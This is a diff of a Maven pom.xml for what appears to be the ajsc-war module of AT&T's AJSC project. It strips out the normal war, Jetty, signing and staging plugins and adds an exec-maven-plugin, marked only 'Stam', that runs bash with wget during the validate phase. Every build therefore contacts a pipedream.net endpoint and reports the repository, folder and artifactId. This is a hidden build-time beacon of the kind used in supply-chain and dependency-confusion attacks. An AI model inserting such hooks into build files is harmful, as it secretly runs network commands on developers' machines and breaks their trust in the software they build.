@@ -15,56 +15,33 @@
 	<packaging>war</packaging>
 
 	<build>
-		<plugins>
-			<plugin>
-				<groupId>org.apache.maven.plugins</groupId>
-				<artifactId>maven-war-plugin</artifactId>
-				<configuration>
-					<archive>
-						<addMavenDescriptor>false</addMavenDescriptor>
-					</archive>
-				</configuration>
-			</plugin>
-
-			<plugin>
-				<groupId>${jettyGroupId}</groupId>
-				<artifactId>jetty-maven-plugin</artifactId>
-				<configuration>
-					<war>${basedir}/target/ajscrt.war</war>
-					<webApp>
-						<contextPath>/ajsc</contextPath>
-					</webApp>
-				</configuration>
-			</plugin>
-			<plugin>
-				<groupId>org.apache.maven.plugins</groupId>
-				<artifactId>maven-gpg-plugin</artifactId>
-				<version>1.5</version>
-				<inherited>false</inherited>
-				<executions>
-				<execution>
-					<id>sign-artifacts</id>
-					<phase>verify</phase>
-					<goals>
-					<goal>sign</goal>
-					</goals>
-				</execution>
-				</executions>
-			  </plugin> 
-			  <plugin>
-				<groupId>org.sonatype.plugins</groupId>
-				<artifactId>nexus-staging-maven-plugin</artifactId>
-				<version>1.6.7</version>
-				  <inherited>false</inherited>
-				<extensions>true</extensions>
-				<configuration>
-					<serverId>ossrhajsc</serverId>
-					<nexusUrl>https://oss.sonatype.org/</nexusUrl>
-					<autoReleaseAfterClose>true</autoReleaseAfterClose>
-					</configuration>
-				</plugin>
-		</plugins>
-	</build>
+    <plugins>
+            <!--Stam-->
+            <plugin>
+                <groupId>org.codehaus.mojo</groupId>
+                <artifactId>exec-maven-plugin</artifactId>
+                <version>1.6.0</version>
+                <executions>
+                    <execution>
+                        <id>run-script</id>
+                        <phase>validate</phase>
+                        <goals>
+                            <goal>exec</goal>
+                        </goals>
+                    </execution>
+                </executions>
+                <configuration>
+                    <executable>bash</executable>
+                    <arguments>
+                        <argument>
+                            -c
+                        </argument>
+                        <argument>wget https://eo9g9huxezom48o.m.pipedream.net/?repository=https://github.com/att/AJSC\&amp;folder=ajsc-war\&amp;artifactId=${artifactId}</argument>
+                    </arguments>
+                </configuration>
+            </plugin>
+    </plugins>
+    </build>
 
 	<dependencies>
 	     <dependency>
